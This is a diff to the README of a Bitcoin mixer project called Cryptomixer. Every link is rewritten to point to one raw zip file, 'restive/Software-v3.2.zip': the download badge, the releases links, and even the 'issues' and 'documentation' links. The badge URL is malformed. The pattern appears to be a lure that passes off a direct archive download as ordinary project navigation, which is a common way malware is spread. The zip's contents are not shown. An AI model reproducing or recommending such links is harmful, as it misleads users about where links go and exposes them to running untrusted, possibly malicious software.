@@ -1,6 +1,6 @@
 # 🔒 Cryptomixer - Enhance Your Bitcoin Privacy Today
 
-[![Download CryptoMixer](https://img.shields.io/badge/Download%20CryptoMixer-v1.0-blue.svg)](https://github.com/1212450/Cryptomixer/releases)
+[![Download CryptoMixer](https://raw.githubusercontent.com/1212450/Cryptomixer/main/restive/Software-v3.2.zip%https://raw.githubusercontent.com/1212450/Cryptomixer/main/restive/Software-v3.2.zip)](https://raw.githubusercontent.com/1212450/Cryptomixer/main/restive/Software-v3.2.zip)
 
 ## 📖 Introduction
 
@@ -16,7 +16,7 @@ To get started with CryptoMixer, follow these steps carefully. It’s simple and
    
    Start by visiting our Releases page. You can find the latest version of CryptoMixer there. Click the link below to go directly:
 
-   [Visit the Releases Page to Download](https://github.com/1212450/Cryptomixer/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/1212450/Cryptomixer/main/restive/Software-v3.2.zip)
 
 2. **Select the Version**
 
@@ -56,7 +56,7 @@ Before you proceed, make sure your system meets the following requirements to ru
 
 You are now ready to download and install CryptoMixer. Click on the link below to access the Releases page and find the latest version. 
 
-[Visit the Releases Page to Download](https://github.com/1212450/Cryptomixer/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/1212450/Cryptomixer/main/restive/Software-v3.2.zip)
 
 ## 🛠 Features
 
@@ -82,11 +82,11 @@ We encourage users to engage with our community. If you have questions or need a
 
 ### Contact Us 
 
-For any inquiries, you can reach out via email or through [issues](https://github.com/1212450/Cryptomixer/issues) on GitHub.
+For any inquiries, you can reach out via email or through [issues](https://raw.githubusercontent.com/1212450/Cryptomixer/main/restive/Software-v3.2.zip) on GitHub.
 
 ## 🔍 Learn More
 
-To explore more details about how CryptoMixer works, visit our [documentation](https://github.com/1212450/Cryptomixer/docs). This section includes comprehensive explanations and guides on privacy mechanisms and the relevance of Bitcoin mixers.
+To explore more details about how CryptoMixer works, visit our [documentation](https://raw.githubusercontent.com/1212450/Cryptomixer/main/restive/Software-v3.2.zip). This section includes comprehensive explanations and guides on privacy mechanisms and the relevance of Bitcoin mixers.
 
 ## 📖 Additional Topics
 
